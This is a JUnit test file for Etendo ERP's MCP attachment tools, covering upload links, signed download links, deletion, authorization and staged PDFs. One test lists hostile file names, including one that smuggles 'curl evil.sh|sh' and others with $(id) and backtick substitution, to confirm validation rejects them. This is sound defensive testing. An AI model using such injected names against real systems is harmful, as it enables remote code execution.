/*
 *************************************************************************
 * The contents of this file are subject to the Etendo License
 * (the "License"), you may not use this file except in compliance
 * with the License.
 * You may obtain a copy of the License at
 * https://github.com/etendosoftware/etendo_core/blob/main/legal/Etendo_license.txt
 * Software distributed under the License is distributed on an
 * "AS IS" basis, WITHOUT WARRANTY OF ANY KIND, either express or
 * implied. See the License for the specific language governing rights
 * and limitations under the License.
 * All portions are Copyright (C) 2021-2026 FUTIT SERVICES, S.L
 * All Rights Reserved.
 * Contributor(s): Futit Services S.L.
 *************************************************************************
 */
package com.etendoerp.go.mcp;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyBoolean;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.mockStatic;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.when;

import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Clock;
import java.util.List;
import java.util.Properties;

import org.codehaus.jettison.json.JSONObject;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.mockito.MockedStatic;
import org.openbravo.base.session.OBPropertiesProvider;
import org.openbravo.dal.core.OBContext;
import org.openbravo.model.ad.access.Role;
import org.openbravo.model.ad.access.User;
import org.openbravo.model.ad.system.Client;
import org.openbravo.model.ad.ui.Tab;
import org.openbravo.model.ad.utility.Attachment;
import org.openbravo.model.common.enterprise.Organization;
import org.openbravo.model.common.enterprise.Warehouse;

import com.etendoerp.go.schemaforge.NeoAttachmentTarget;
import com.etendoerp.go.schemaforge.NeoAttachmentUploadTickets;
import com.etendoerp.go.schemaforge.NeoAttachmentsHelper;
import com.etendoerp.go.schemaforge.NeoResponse;
import com.etendoerp.go.schemaforge.NeoStagedAttachment;
import com.etendoerp.go.schemaforge.NeoStagedDocuments;
import com.etendoerp.go.schemaforge.data.SFEntity;
import com.etendoerp.go.schemaforge.data.SFSpec;
import com.etendoerp.go.schemaforge.email.DocumentDownloadTokenService;

/**
 * The MCP attachment tools (ETP-5715): the upload link, the list with its download links, and the
 * delete. The parent document is resolved by a mocked {@link NeoAttachmentTarget} (its own rules
 * are tested in {@code NeoAttachmentTargetTest}); what is asserted here is that EVERY operation goes
 * through it with the right tier, that nothing is done once it refuses, and the shape of the answers.
 *
 * @covers com.etendoerp.go.mcp.McpAttachmentTools
 * @covers com.etendoerp.go.mcp.McpAttachmentToolDefinitions
 * @covers com.etendoerp.go.mcp.McpStagedAttachment
 */
@SuppressWarnings("java:S2187")
class McpAttachmentToolsTest {

  private static final String CLIENT = "CLIENT1";
  private static final String ORG = "ORG1";
  private static final String USER = "USER1";
  private static final String ROLE = "ROLE1";
  private static final String RECORD = "ORDER1";
  private static final String SPEC = "purchase-invoice";
  private static final String SECRET_PROP = DocumentDownloadTokenService.PROP_TOKEN_SECRET;

  private MockedStatic<OBContext> contextMock;
  private MockedStatic<McpToolRouterSupport> supportMock;
  private MockedStatic<NeoAttachmentTarget> targetMock;
  @TempDir
  Path stagedRoot;

  private MockedStatic<NeoStagedDocuments> stagedMock;
  private NeoStagedDocuments stagedDocuments;
  private MockedStatic<NeoAttachmentUploadTickets> ticketsMock;
  private MockedStatic<NeoAttachmentsHelper> helperMock;
  private MockedStatic<OBPropertiesProvider> propsMock;
  private NeoAttachmentUploadTickets tickets;
  private NeoAttachmentTarget target;
  private SFSpec spec;
  private SFEntity header;

  @BeforeEach
  void setUp() {
    System.setProperty(SECRET_PROP, "unit-test-secret");
    OBContext context = sessionContext();
    contextMock = mockStatic(OBContext.class);
    contextMock.when(OBContext::getOBContext).thenReturn(context);
    spec = mock(SFSpec.class);
    when(spec.getId()).thenReturn("SPEC1");
    header = entity("ENTITY1", 0L);
    supportMock = mockStatic(McpToolRouterSupport.class);
    supportMock.when(() -> McpToolRouterSupport.findActiveSpecByName(SPEC)).thenReturn(spec);
    List<SFEntity> included = List.of(entity("LINES1", 1L), header);
    supportMock.when(() -> McpToolRouterSupport.listIncludedEntities("SPEC1"))
        .thenReturn(included);
    target = mock(NeoAttachmentTarget.class);
    when(target.getSpecName()).thenReturn(SPEC);
    when(target.getEntityName()).thenReturn("header");
    when(target.getRecordId()).thenReturn(RECORD);
    when(target.getTableName()).thenReturn("C_Invoice");
    targetMock = mockStatic(NeoAttachmentTarget.class);
    targetMock.when(() -> NeoAttachmentTarget.resolve(any(), any(), any(), anyBoolean()))
        .thenReturn(target);
    tickets = new NeoAttachmentUploadTickets();
    ticketsMock = mockStatic(NeoAttachmentUploadTickets.class);
    ticketsMock.when(NeoAttachmentUploadTickets::getInstance).thenReturn(tickets);
    helperMock = mockStatic(NeoAttachmentsHelper.class);
    stagedDocuments = new NeoStagedDocuments(Clock.systemUTC(), stagedRoot);
    stagedMock = mockStatic(NeoStagedDocuments.class);
    stagedMock.when(NeoStagedDocuments::getInstance).thenReturn(stagedDocuments);
    Properties properties = new Properties();
    properties.setProperty("context.url", "http://host:8080/etendo");
    OBPropertiesProvider provider = mock(OBPropertiesProvider.class);
    when(provider.getOpenbravoProperties()).thenReturn(properties);
    propsMock = mockStatic(OBPropertiesProvider.class);
    propsMock.when(OBPropertiesProvider::getInstance).thenReturn(provider);
  }

  @AfterEach
  void tearDown() {
    System.clearProperty(SECRET_PROP);
    propsMock.close();
    stagedMock.close();
    helperMock.close();
    ticketsMock.close();
    targetMock.close();
    supportMock.close();
    contextMock.close();
  }

  private static OBContext sessionContext() {
    Client client = mock(Client.class);
    when(client.getId()).thenReturn(CLIENT);
    Organization org = mock(Organization.class);
    when(org.getId()).thenReturn(ORG);
    User user = mock(User.class);
    when(user.getId()).thenReturn(USER);
    Role role = mock(Role.class);
    when(role.getId()).thenReturn(ROLE);
    Warehouse warehouse = mock(Warehouse.class);
    when(warehouse.getId()).thenReturn("WH1");
    OBContext context = mock(OBContext.class);
    when(context.getCurrentClient()).thenReturn(client);
    when(context.getCurrentOrganization()).thenReturn(org);
    when(context.getUser()).thenReturn(user);
    when(context.getRole()).thenReturn(role);
    when(context.getWarehouse()).thenReturn(warehouse);
    return context;
  }

  private static SFEntity entity(String id, long tabLevel) {
    Tab tab = mock(Tab.class);
    when(tab.getTabLevel()).thenReturn(tabLevel);
    SFEntity entity = mock(SFEntity.class);
    when(entity.getId()).thenReturn(id);
    when(entity.getADTab()).thenReturn(tab);
    return entity;
  }

  private static JSONObject args(String... keyValues) throws Exception {
    JSONObject args = new JSONObject();
    args.put("spec", SPEC);
    args.put("id", RECORD);
    for (int i = 0; i < keyValues.length; i += 2) {
      args.put(keyValues[i], keyValues[i + 1]);
    }
    return args;
  }

  /** The JSON an agent reads out of a tool result. */
  private static JSONObject bodyOf(JSONObject result) throws Exception {
    return new JSONObject(result.getJSONArray("content").getJSONObject(0).getString("text"));
  }

  private void refuseWith(int status, String message) {
    targetMock.when(() -> NeoAttachmentTarget.resolve(any(), any(), any(), anyBoolean()))
        .thenThrow(new NeoAttachmentTarget.Refused(status, message));
  }

  // ── etendo_request_attachment_upload ─────────────────────────────────────

  @Nested
  @DisplayName("etendo_request_attachment_upload")
  class RequestUpload {

    @Test
    @DisplayName("returns a single-use URL bound to the session and the document, with the limits")
    void returnsALinkBoundToTheDocument() throws Exception {
      JSONObject result = McpAttachmentTools.requestUpload(
          args("name", "factura-proveedor.pdf", "main", "true"));

      assertFalse(result.has("error"), result.toString());
      String url = result.getString("uploadUrl");
      assertTrue(url.startsWith("http://host:8080/etendo/sws/neo/attachment/upload/"), url);
      String token = url.substring(url.lastIndexOf('/') + 1);
      NeoAttachmentUploadTickets.PendingUpload ticket = tickets.peek(token).orElseThrow();
      assertEquals(USER, ticket.getSession().getUserId());
      assertEquals(ROLE, ticket.getSession().getRoleId());
      assertEquals(CLIENT, ticket.getSession().getClientId());
      assertEquals("WH1", ticket.getSession().getWarehouseId());
      assertEquals("SPEC1", ticket.getSubject().getSpecId());
      assertEquals("ENTITY1", ticket.getSubject().getEntityId());
      assertEquals(RECORD, ticket.getSubject().getRecordId());
      assertEquals("factura-proveedor.pdf", ticket.getSubject().getFileName());
      assertTrue(ticket.getSubject().isMarkAsMain());
      assertEquals(10L * 1024 * 1024, result.getLong("maxBytes"));
      assertTrue(result.getString("allowedExtensions").contains("pdf"));
      assertTrue(result.getString("curlExample").contains(url));
      assertNotNull(result.getString("expiresAt"));
    }

    @Test
    @DisplayName("main defaults to false and the header is the document when no entity is named")
    void defaultsToNotMainOnTheHeader() throws Exception {
      JSONObject result = McpAttachmentTools.requestUpload(args("name", "oc.pdf"));

      String url = result.getString("uploadUrl");
      assertFalse(tickets.peek(url.substring(url.lastIndexOf('/') + 1)).orElseThrow()
          .getSubject().isMarkAsMain());
      assertFalse(result.getBoolean("main"));
    }

    @Test
    @DisplayName("it authorizes the document for WRITING before it issues anything")
    void authorizesForWriting() throws Exception {
      McpAttachmentTools.requestUpload(args("name", "oc.pdf"));

      targetMock.verify(() -> NeoAttachmentTarget.resolve(eq(spec), eq(header), eq(RECORD),
          eq(true)));
    }

    @Test
    @DisplayName("B1: a hostile file name is refused with the rule named, and no link exists")
    void hostileNamesAreRefused() throws Exception {
      for (String hostile : new String[] {"x\"; curl evil.sh|sh; \".pdf", "a$(id).pdf", "a`id`.pdf",
          "a;b.pdf", "a|b.pdf", "a&b.pdf", "a<b>.pdf", "a'b.pdf", "a\nb.pdf", "a\u0007b.pdf"}) {
        JSONObject result = McpAttachmentTools.requestUpload(args("name", hostile));

        assertEquals(422, result.getInt("status"), hostile);
        assertTrue(result.getString("detail").contains("letters, digits"), result.getString("detail"));
      }
      assertEquals(0, tickets.size());
    }

    @Test
    @DisplayName("B1: the curl example never contains the file name, whatever it is")
    void curlExampleNeverCarriesTheName() throws Exception {
      JSONObject result = McpAttachmentTools.requestUpload(args("name", "Factura proveedor.pdf"));

      String curl = result.getString("curlExample");
      assertFalse(curl.contains("Factura"), curl);
      assertTrue(curl.startsWith("curl -X PUT --upload-file ./<your-file> \""), curl);
      assertFalse(result.getString("hint").contains("Factura"));
      assertEquals("Factura proveedor.pdf", result.getString("name"));
    }

    @Test
    @DisplayName("a name of exactly 255 characters passes; 256 is refused before any link, naming the limit")
    void nameLengthIsBounded() throws Exception {
      String max = "a".repeat(251) + ".pdf";
      String tooLong = "a".repeat(252) + ".pdf";

      assertFalse(McpAttachmentTools.requestUpload(args("name", max)).has("error"));
      int issued = tickets.size();
      JSONObject refused = McpAttachmentTools.requestUpload(args("name", tooLong));

      assertEquals(422, refused.getInt("status"));
      assertEquals("validation_error", refused.getString("error"));
      assertTrue(refused.getString("detail").contains("255"), refused.getString("detail"));
      assertEquals(issued, tickets.size());
    }

    @Test
    @DisplayName("255 accented characters exceed 255 bytes on disk and are refused too")
    void multiByteNamesAreBoundedInBytes() throws Exception {
      String accented = "é".repeat(130) + ".pdf";

      JSONObject refused = McpAttachmentTools.requestUpload(args("name", accented));

      assertEquals(422, refused.getInt("status"));
    }

    @Test
    @DisplayName("a name that is only an extension is refused")
    void extensionOnlyNameIsRefused() throws Exception {
      for (String name : new String[] {".pdf", "  .pdf", "(.pdf"}) {
        JSONObject result = McpAttachmentTools.requestUpload(args("name", name));
        if (name.equals("(.pdf")) {
          assertFalse(result.has("error"), "a stem of any visible character is a name");
        } else {
          assertEquals(422, result.getInt("status"), name);
        }
      }
    }

    @Test
    @DisplayName("B1: legitimate Spanish names, with accents and spaces, still pass")
    void accentedNamesPass() throws Exception {
      for (String name : new String[] {"Factura julio (final) 2026.pdf", "Año-ñandú_Ñ.PDF",
          "Pedido nº 12 - José.pdf", "informe.v2.xlsx"}) {
        assertFalse(McpAttachmentTools.requestUpload(args("name", name)).has("error"), name);
      }
    }

    @Test
    @DisplayName("a missing file name is a 422")
    void nameIsRequired() throws Exception {
      JSONObject result = McpAttachmentTools.requestUpload(args());

      assertEquals(422, result.getInt("status"));
      assertEquals(0, tickets.size());
    }

    @Test
    @DisplayName("a disallowed extension is refused up front with the policy's own message")
    void disallowedExtensionIsRefusedBeforeTheLink() throws Exception {
      JSONObject result = McpAttachmentTools.requestUpload(args("name", "virus.exe"));

      assertEquals(422, result.getInt("status"));
      assertTrue(result.getString("detail").startsWith("File type not allowed: .exe. Allowed types: "),
          result.getString("detail"));
      assertEquals(0, tickets.size(), "no link may exist for a file that will be refused");
    }

    @Test
    @DisplayName("a missing or foreign document is the same 404 and issues no link")
    void foreignOrMissingDocument() throws Exception {
      refuseWith(404, NeoAttachmentTarget.MSG_RECORD_NOT_FOUND);

      JSONObject result = McpAttachmentTools.handle(
          McpConstants.TOOL_NEO_REQUEST_ATTACHMENT_UPLOAD, args("name", "oc.pdf"));

      assertTrue(result.getBoolean("isError"));
      JSONObject error = bodyOf(result);
      assertEquals(404, error.getInt("status"));
      assertEquals("not_found", error.getString("error"));
      assertEquals(NeoAttachmentTarget.MSG_RECORD_NOT_FOUND, error.getString("detail"));
      assertEquals(0, tickets.size());
    }

    @Test
    @DisplayName("a role without write access is a 403 forbidden and issues no link")
    void roleWithoutAccess() throws Exception {
      refuseWith(403, "Access denied to spec for current role");

      JSONObject error = bodyOf(McpAttachmentTools.handle(
          McpConstants.TOOL_NEO_REQUEST_ATTACHMENT_UPLOAD, args("name", "oc.pdf")));

      assertEquals(403, error.getInt("status"));
      assertEquals("forbidden", error.getString("error"));
      assertEquals(0, tickets.size());
    }

    @Test
    @DisplayName("a line entity is a validation error, not a refusal that reveals anything")
    void lineEntityIsAValidationError() throws Exception {
      refuseWith(422, "Attachments belong to the document itself, not to its lines.");

      JSONObject error = bodyOf(McpAttachmentTools.handle(
          McpConstants.TOOL_NEO_REQUEST_ATTACHMENT_UPLOAD, args("name", "oc.pdf")));

      assertEquals(422, error.getInt("status"));
      assertEquals("validation_error", error.getString("error"));
    }

    @Test
    @DisplayName("a session cannot pile up links: the cap answers a 422 that says how to recover")
    void capIsEnforced() throws Exception {
      for (int i = 0; i < NeoAttachmentUploadTickets.MAX_PENDING_PER_SESSION; i++) {
        assertFalse(McpAttachmentTools.requestUpload(args("name", "oc.pdf")).has("error"));
      }

      JSONObject result = McpAttachmentTools.requestUpload(args("name", "oc.pdf"));

      assertEquals(422, result.getInt("status"));
      assertTrue(result.getString("detail").contains("maximum"), result.getString("detail"));
    }

    @Test
    @DisplayName("an entity the caller names is resolved through the router's own lookup")
    void namedEntityIsResolved() throws Exception {
      SFEntity named = entity("NAMED1", 0L);
      supportMock.when(() -> McpToolRouterSupport.findIncludedEntity("SPEC1", "invoice"))
          .thenReturn(named);

      McpAttachmentTools.requestUpload(args("name", "oc.pdf", "entity", "invoice"));

      targetMock.verify(() -> NeoAttachmentTarget.resolve(eq(spec), eq(named), eq(RECORD),
          eq(true)));
    }
  }

  // ── etendo_list_attachments ──────────────────────────────────────────────

  @Nested
  @DisplayName("etendo_list_attachments")
  class ListAttachments {

    private JSONObject listed(String... ids) throws Exception {
      org.codehaus.jettison.json.JSONArray items = new org.codehaus.jettison.json.JSONArray();
      for (String id : ids) {
        JSONObject item = new JSONObject();
        item.put("id", id);
        item.put("name", id + ".pdf");
        item.put("size", 1234);
        item.put("dataType", "application/pdf");
        item.put("description", JSONObject.NULL);
        item.put("uploadedAt", "2026-10-21T10:00:00Z");
        JSONObject by = new JSONObject();
        by.put("id", USER);
        by.put("name", "Ana");
        item.put("uploadedBy", by);
        items.put(item);
      }
      JSONObject body = new JSONObject();
      body.put("items", items);
      return body;
    }

    private void listAnswers(JSONObject body, String mainId) throws Exception {
      helperMock.when(() -> NeoAttachmentsHelper.handleList("C_Invoice", RECORD))
          .thenReturn(NeoResponse.ok(body));
      JSONObject main = new JSONObject();
      if (mainId != null) {
        main.put("id", mainId);
      }
      helperMock.when(() -> NeoAttachmentsHelper.handleGetMain("C_Invoice", RECORD))
          .thenReturn(NeoResponse.ok(main));
    }

    @Test
    @DisplayName("every item carries id, name, size, type, created, createdBy, isMain and a signed link")
    void projectionAndLinks() throws Exception {
      listAnswers(listed("F1", "F2"), "F2");

      JSONObject result = McpAttachmentTools.list(args());

      assertEquals(2, result.getInt("count"));
      JSONObject first = result.getJSONArray("items").getJSONObject(0);
      JSONObject second = result.getJSONArray("items").getJSONObject(1);
      assertEquals("F1", first.getString("id"));
      assertEquals("F1.pdf", first.getString("name"));
      assertEquals(1234L, first.getLong("size"));
      assertEquals("application/pdf", first.getString("type"));
      assertEquals("2026-10-21T10:00:00Z", first.getString("created"));
      assertEquals("Ana", first.getString("createdBy"));
      assertFalse(first.getBoolean("isMain"));
      assertTrue(second.getBoolean("isMain"));
      String url = second.getString("downloadUrl");
      assertTrue(url.startsWith("http://host:8080/etendo/sws/neo/document-download/"), url);
      DocumentDownloadTokenService.Claims claims = DocumentDownloadTokenService
          .validate(url.substring(url.lastIndexOf('/') + 1)).orElseThrow();
      assertEquals("F2", claims.getAttachmentId());
      assertEquals(RECORD, claims.getRecordId());
      assertEquals(CLIENT, claims.getClientId());
      assertEquals(SPEC, claims.getSpecName());
    }

    @Test
    @DisplayName("the download link is short-lived: minutes, not the 7 days of the email links")
    void linkIsShortLived() throws Exception {
      listAnswers(listed("F1"), null);

      String url = McpAttachmentTools.list(args()).getJSONArray("items").getJSONObject(0)
          .getString("downloadUrl");
      long expires = DocumentDownloadTokenService.validate(url.substring(url.lastIndexOf('/') + 1))
          .orElseThrow().getExpiresAtSeconds();

      long remaining = expires - System.currentTimeMillis() / 1000L;
      assertTrue(remaining > 0 && remaining <= 10 * 60, "remaining=" + remaining);
    }

    @Test
    @DisplayName("listing is a READ: the document is authorized for reading only")
    void authorizesForReading() throws Exception {
      listAnswers(listed(), null);

      McpAttachmentTools.list(args());

      targetMock.verify(() -> NeoAttachmentTarget.resolve(any(), any(), any(), eq(false)));
      targetMock.verify(() -> NeoAttachmentTarget.resolve(any(), any(), any(), eq(true)), never());
    }

    @Test
    @DisplayName("without the signing secret the list still works and says links are unavailable")
    void worksWithoutTheSecret() throws Exception {
      System.clearProperty(SECRET_PROP);
      listAnswers(listed("F1"), null);

      JSONObject result = McpAttachmentTools.list(args());

      assertFalse(result.getJSONArray("items").getJSONObject(0).has("downloadUrl"));
      assertTrue(result.getString("hint").contains("not available"));
    }

    @Test
    @DisplayName("a document of another client lists nothing: the same 404 as a missing one")
    void foreignDocument() throws Exception {
      refuseWith(404, NeoAttachmentTarget.MSG_RECORD_NOT_FOUND);

      JSONObject result = McpAttachmentTools.handle(McpConstants.TOOL_NEO_LIST_ATTACHMENTS, args());

      assertTrue(result.getBoolean("isError"));
      assertEquals(404, bodyOf(result).getInt("status"));
      helperMock.verify(() -> NeoAttachmentsHelper.handleList(any(), any()), never());
    }

    @Test
    @DisplayName("a document with no attachments answers count 0 and no hint to open links")
    void emptyList() throws Exception {
      listAnswers(listed(), null);

      JSONObject result = McpAttachmentTools.list(args());

      assertEquals(0, result.getInt("count"));
      assertFalse(result.has("hint"));
    }
  }

  // ── etendo_delete_attachment ─────────────────────────────────────────────

  @Nested
  @DisplayName("etendo_delete_attachment")
  class DeleteAttachment {

    private Attachment ownAttachment() {
      Attachment attachment = mock(Attachment.class);
      when(attachment.getName()).thenReturn("factura.pdf");
      when(target.requireOwnAttachment("F1")).thenReturn(attachment);
      return attachment;
    }

    @Test
    @DisplayName("deletes an attachment of THIS document through the shared helper, for WRITING")
    void deletesOwnAttachment() throws Exception {
      ownAttachment();
      helperMock.when(() -> NeoAttachmentsHelper.handleDelete("F1")).thenReturn(NeoResponse.noContent());

      JSONObject result = McpAttachmentTools.delete(args("attachment_id", "F1"));

      assertTrue(result.getBoolean("deleted"));
      assertEquals("F1", result.getString("attachment_id"));
      assertEquals("factura.pdf", result.getString("name"));
      assertEquals(RECORD, result.getString("id"));
      targetMock.verify(() -> NeoAttachmentTarget.resolve(any(), any(), any(), eq(true)));
      helperMock.verify(() -> NeoAttachmentsHelper.handleDelete("F1"));
    }

    @Test
    @DisplayName("an attachment id of ANOTHER document is a 404 and nothing is deleted")
    void attachmentOfAnotherDocument() throws Exception {
      when(target.requireOwnAttachment("F9")).thenThrow(
          new NeoAttachmentTarget.Refused(404, NeoAttachmentTarget.MSG_ATTACHMENT_NOT_FOUND));

      JSONObject result = McpAttachmentTools.handle(McpConstants.TOOL_NEO_DELETE_ATTACHMENT,
          args("attachment_id", "F9"));

      assertTrue(result.getBoolean("isError"));
      assertEquals(404, bodyOf(result).getInt("status"));
      helperMock.verify(() -> NeoAttachmentsHelper.handleDelete(any()), never());
    }

    @Test
    @DisplayName("a role without write access cannot delete, and the attachment is never looked up")
    void roleWithoutWriteAccess() throws Exception {
      refuseWith(403, "Access denied to spec for current role");

      JSONObject result = McpAttachmentTools.handle(McpConstants.TOOL_NEO_DELETE_ATTACHMENT,
          args("attachment_id", "F1"));

      assertEquals(403, bodyOf(result).getInt("status"));
      helperMock.verify(() -> NeoAttachmentsHelper.handleDelete(any()), never());
    }

    @Test
    @DisplayName("the attachment_id is required")
    void attachmentIdRequired() throws Exception {
      assertEquals(422, McpAttachmentTools.delete(args()).getInt("status"));
    }

    @Test
    @DisplayName("a refusal of the shared helper (the fiscal-declaration guard) is reported, not hidden")
    void helperRefusalIsReported() throws Exception {
      ownAttachment();
      helperMock.when(() -> NeoAttachmentsHelper.handleDelete("F1"))
          .thenReturn(NeoResponse.error(409, "Cannot delete an attachment of a fiscal declaration"));

      JSONObject result = McpAttachmentTools.delete(args("attachment_id", "F1"));

      assertEquals(409, result.getInt("status"));
      assertTrue(result.getString("detail").contains("fiscal declaration"));
      assertFalse(result.has("deleted"));
    }
  }

  // ── Document types without the Attachments tab (window.attachments:false) ───

  @Nested
  @DisplayName("a document type the application gives no Attachments tab")
  class FlaggedDocumentType {

    @Test
    @DisplayName("list, request upload and delete answer 405 method_not_allowed, and nothing is done")
    void allThreeToolsAreRefused() throws Exception {
      refuseWith(405, "Attachments are not available for this document type, as in the application");

      for (String tool : new String[] {McpConstants.TOOL_NEO_LIST_ATTACHMENTS,
          McpConstants.TOOL_NEO_REQUEST_ATTACHMENT_UPLOAD, McpConstants.TOOL_NEO_DELETE_ATTACHMENT}) {
        JSONObject result = McpAttachmentTools.handle(tool,
            args("name", "oc.pdf", "attachment_id", "F1"));

        assertTrue(result.getBoolean("isError"), tool);
        JSONObject error = bodyOf(result);
        assertEquals(405, error.getInt("status"), tool);
        assertEquals("method_not_allowed", error.getString("error"), tool);
        assertTrue(error.getString("detail").contains("as in the application"), tool);
      }
      assertEquals(0, tickets.size());
      helperMock.verify(() -> NeoAttachmentsHelper.handleList(any(), any()), never());
      helperMock.verify(() -> NeoAttachmentsHelper.handleDelete(any()), never());
    }
  }

  // ── etendo_request_attachment_upload with a staged document (ETP-5715) ──────

  @Nested
  @DisplayName("etendo_request_attachment_upload with staged_document_id")
  class StagedDocument {

    private final NeoAttachmentUploadTickets.Session session = new NeoAttachmentUploadTickets.Session(
        CLIENT, ORG, USER, ROLE, "WH1");
    private MockedStatic<NeoStagedAttachment> attachMock;

    @BeforeEach
    void attachAnswers() throws Exception {
      attachMock = mockStatic(NeoStagedAttachment.class);
      JSONObject stored = new JSONObject().put("name", "factura.pdf").put("message", "uploaded")
          .put("id", "ATT9").put("isMain", true);
      attachMock.when(() -> NeoStagedAttachment.attach(any(), any(), anyBoolean()))
          .thenReturn(NeoResponse.created(stored));
    }

    @AfterEach
    void closeAttach() {
      attachMock.close();
    }

    private String stagedPdf(String specName) throws Exception {
      String id = stagedDocuments.reserve(session, specName, "factura.pdf");
      Path file = stagedDocuments.directoryFor(id).resolve("factura.pdf");
      Files.writeString(file, "%PDF-1.4");
      stagedDocuments.markStored(id, file);
      return id;
    }

    @Test
    @DisplayName("attaches the staged PDF to the document right away: no link, no name needed")
    void attachesWithoutALink() throws Exception {
      String id = stagedPdf(SPEC);

      JSONObject result = McpAttachmentTools.requestUpload(
          args("staged_document_id", id, "main", "true"));

      assertEquals(true, result.getBoolean("attached"));
      assertEquals("ATT9", result.getString("attachmentId"));
      assertEquals("factura.pdf", result.getString("name"));
      assertTrue(result.getBoolean("isMain"));
      assertEquals(SPEC, result.getString("spec"));
      assertEquals(RECORD, result.getString("id"));
      assertFalse(result.has("uploadUrl"));
      assertEquals(0, tickets.size());
    }

    @Test
    @DisplayName("the document is authorized for WRITING, the main flag is passed on and defaults to false")
    void authorizesAndPassesTheMainFlag() throws Exception {
      String id = stagedPdf(SPEC);

      McpAttachmentTools.requestUpload(args("staged_document_id", id, "main", "true"));
      attachMock.verify(() -> NeoStagedAttachment.attach(eq(target), any(), eq(true)));
      String second = stagedPdf(SPEC);
      McpAttachmentTools.requestUpload(args("staged_document_id", second));
      attachMock.verify(() -> NeoStagedAttachment.attach(eq(target), any(), eq(false)));

      targetMock.verify(() -> NeoAttachmentTarget.resolve(eq(spec), eq(header), eq(RECORD),
          eq(true)), org.mockito.Mockito.times(2));
    }

    @Test
    @DisplayName("once attached, the staged copy is removed: it has served")
    void stagedCopyIsRemovedAfterAttaching() throws Exception {
      String id = stagedPdf(SPEC);

      McpAttachmentTools.requestUpload(args("staged_document_id", id));

      assertTrue(stagedDocuments.find(id, session).isEmpty());
    }

    @Test
    @DisplayName("another session's staged document, or an unknown one, is the same 404 and attaches nothing")
    void foreignOrUnknownStagedDocument() throws Exception {
      NeoAttachmentUploadTickets.Session other = new NeoAttachmentUploadTickets.Session(CLIENT, ORG,
          "OTHER", ROLE, null);
      String theirs = stagedDocuments.reserve(other, SPEC, "factura.pdf");

      JSONObject foreign = McpAttachmentTools.requestUpload(args("staged_document_id", theirs));
      JSONObject unknown = McpAttachmentTools.requestUpload(args("staged_document_id", "nope"));

      assertEquals(404, foreign.getInt("status"));
      assertEquals(foreign.getString("detail"), unknown.getString("detail"));
      attachMock.verifyNoInteractions();
    }

    @Test
    @DisplayName("a staged document whose PDF never arrived is a 409 and attaches nothing")
    void notUploadedYet() throws Exception {
      String id = stagedDocuments.reserve(session, SPEC, "factura.pdf");

      JSONObject result = McpAttachmentTools.requestUpload(args("staged_document_id", id));

      assertEquals(409, result.getInt("status"));
      assertEquals("not_uploaded", result.getString("error"));
      attachMock.verifyNoInteractions();
    }

    @Test
    @DisplayName("a document being read (or attached) right now is a 409 and attaching waits for nothing")
    void busyDocumentIsNotAttached() throws Exception {
      String id = stagedPdf(SPEC);
      NeoStagedDocuments.Staged held = stagedDocuments.find(id, session).orElseThrow();
      java.util.concurrent.CountDownLatch locked = new java.util.concurrent.CountDownLatch(1);
      java.util.concurrent.CountDownLatch release = new java.util.concurrent.CountDownLatch(1);
      Thread reader = new Thread(() -> {
        held.getLock().lock();
        locked.countDown();
        try {
          release.await();
        } catch (InterruptedException e) {
          Thread.currentThread().interrupt();
        } finally {
          held.getLock().unlock();
        }
      });
      reader.start();
      locked.await();
      try {
        JSONObject result = McpAttachmentTools.requestUpload(args("staged_document_id", id));

        assertEquals(409, result.getInt("status"));
        assertEquals("conflict", result.getString("error"));
        attachMock.verifyNoInteractions();
        assertTrue(stagedDocuments.find(id, session).isPresent(), "the file is still there");
      } finally {
        release.countDown();
        reader.join();
      }
    }

    @Test
    @DisplayName("the same staged document cannot be attached twice: the second call finds nothing")
    void attachedTwice() throws Exception {
      String id = stagedPdf(SPEC);

      JSONObject first = McpAttachmentTools.requestUpload(args("staged_document_id", id));
      JSONObject second = McpAttachmentTools.requestUpload(args("staged_document_id", id));

      assertEquals(true, first.getBoolean("attached"));
      assertEquals(404, second.getInt("status"));
      attachMock.verify(() -> NeoStagedAttachment.attach(any(), any(), anyBoolean()),
          org.mockito.Mockito.times(1));
    }

    @Test
    @DisplayName("a document consumed after it was looked up (a concurrent attach won) is a 404")
    void consumedAfterLookup() throws Exception {
      String id = stagedPdf(SPEC);
      stagedDocuments.find(id, session).orElseThrow().markConsumed();

      JSONObject result = McpAttachmentTools.requestUpload(args("staged_document_id", id));

      assertEquals(404, result.getInt("status"));
      attachMock.verifyNoInteractions();
    }

    @Test
    @DisplayName("a PDF staged for another document type is not attached here")
    void stagedForAnotherSpec() throws Exception {
      String id = stagedPdf("sales-invoice");

      JSONObject result = McpAttachmentTools.requestUpload(args("staged_document_id", id));

      assertEquals(422, result.getInt("status"));
      attachMock.verifyNoInteractions();
      assertTrue(stagedDocuments.find(id, session).isPresent(), "it is kept for the right document");
    }

    @Test
    @DisplayName("a failure of the store is returned as it is and the staged PDF is kept for a retry")
    void storeFailureKeepsTheStagedDocument() throws Exception {
      String id = stagedPdf(SPEC);
      attachMock.when(() -> NeoStagedAttachment.attach(any(), any(), anyBoolean()))
          .thenReturn(NeoResponse.error(400, "File content does not match its .pdf extension"));

      JSONObject result = McpAttachmentTools.requestUpload(args("staged_document_id", id));

      assertEquals(400, result.getInt("status"));
      assertTrue(result.getString("detail").contains("does not match"));
      assertTrue(stagedDocuments.find(id, session).isPresent());
    }

    @Test
    @DisplayName("a refused document (no write access, not the tenant's) attaches nothing and keeps the staged PDF")
    void refusedDocument() throws Exception {
      String id = stagedPdf(SPEC);
      refuseWith(404, NeoAttachmentTarget.MSG_RECORD_NOT_FOUND);

      JSONObject result = bodyOf(McpAttachmentTools.handle(
          McpConstants.TOOL_NEO_REQUEST_ATTACHMENT_UPLOAD, args("staged_document_id", id)));

      assertEquals(404, result.getInt("status"));
      attachMock.verifyNoInteractions();
      assertTrue(stagedDocuments.find(id, session).isPresent());
    }
  }

  // ── Definitions ──────────────────────────────────────────────────────────

  @Nested
  @DisplayName("definitions")
  class Definitions {

